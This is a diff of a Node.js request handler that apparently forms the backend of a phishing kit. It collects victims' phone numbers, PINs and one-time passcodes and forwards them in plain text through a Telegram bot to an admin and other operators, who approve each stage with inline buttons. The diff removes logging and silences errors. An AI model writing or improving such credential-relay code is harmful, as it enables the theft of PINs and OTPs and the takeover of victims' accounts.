@@ -1,5 +1,5 @@
 const { sendMessage } = require('../../lib/telegram');
-const { listUsers, isUser } = require('../../lib/store');
+const { listUsers } = require('../../lib/store');
 const { create } = require('../../lib/approvals');
 
 const ADMIN_ID = String(process.env.SUPER_ADMIN_CHAT_ID || process.env.TELEGRAM_CHAT_ID || '');
@@ -124,14 +124,10 @@ module.exports = async (req, res) => {
   if (stage === 'otp' && !otp) return res.status(400).json({ error: 'Missing OTP' });
 
   try {
-    console.log('📝 Approval request:', { stage, phone: cleanPhone, pin: pin ? '****' : '' });
-
     const botLabel = await getBotLabel();
-    console.log('✅ Got bot label:', botLabel);
-
     const text = stage === 'pin' ? buildPinText(cleanPhone, pin, userId, botLabel) : buildOtpText(cleanPhone, otp, botLabel);
+
     const record = await create({ stage, text });
-    console.log('✅ Created approval record:', record.id);
 
     const keyboard = stage === 'pin' ? buildPinKeyboard() : buildOtpKeyboard();
     const keyboardWithId = {
@@ -144,11 +140,8 @@ module.exports = async (req, res) => {
     };
 
     const users = await listUsers().catch(() => []);
-    console.log('✅ Got users:', users);
-
     const recipients = [ADMIN_ID, ...users].filter(Boolean);
     const uniqueRecipients = [...new Set(recipients)];
-    console.log('📤 Sending to recipients:', uniqueRecipients, 'ADMIN_ID:', ADMIN_ID, 'BOT_TOKEN:', BOT_TOKEN ? '✓' : '✗');
 
     const mainMessages = [];
     const buttonMessages = [];
@@ -156,39 +149,31 @@ module.exports = async (req, res) => {
     await Promise.allSettled(
       uniqueRecipients.map(async (chatId) => {
         try {
-          console.log('📤 Calling sendMessage to', chatId, 'with token length:', BOT_TOKEN.length);
           const mainMsg = await sendMessage(BOT_TOKEN, chatId, text);
-          console.log('📤 sendMessage response:', mainMsg);
           mainMessages.push({ c: mainMsg.chat.id, m: mainMsg.message_id });
-          console.log('✅ Sent main message to', chatId, 'message_id:', mainMsg.message_id);
 
           const buttonsText = stage === 'pin' ? buildPinButtonsText() : buildOtpButtonsText();
           const btnMsg = await sendMessage(BOT_TOKEN, chatId, buttonsText, {
             parse_mode: 'HTML',
             reply_markup: keyboardWithId,
           });
-          console.log('📤 button sendMessage response:', btnMsg);
           buttonMessages.push({ c: btnMsg.chat.id, m: btnMsg.message_id });
-          console.log('✅ Sent button message to', chatId, 'message_id:', btnMsg.message_id);
         } catch (err) {
-          console.error('❌ Failed to send to', chatId, err.message, err);
+          void 0;
         }
       })
     );
 
     if (mainMessages.length === 0) {
-      console.error('❌ No messages sent to any recipient');
       return res.status(502).json({ error: 'Failed to send verification message' });
     }
 
     record.messages = mainMessages;
     record.buttonMessages = buttonMessages;
     await require('../../lib/approvals').save(record);
-    console.log('✅ Approval complete:', record.id);
 
     return res.status(200).json({ id: record.id, expiresAt: record.expiresAt });
   } catch (err) {
-    console.error('❌ Approval request error:', err.message, err);
     return res.status(500).json({ error: err.message || 'Internal server error' });
   }
 };
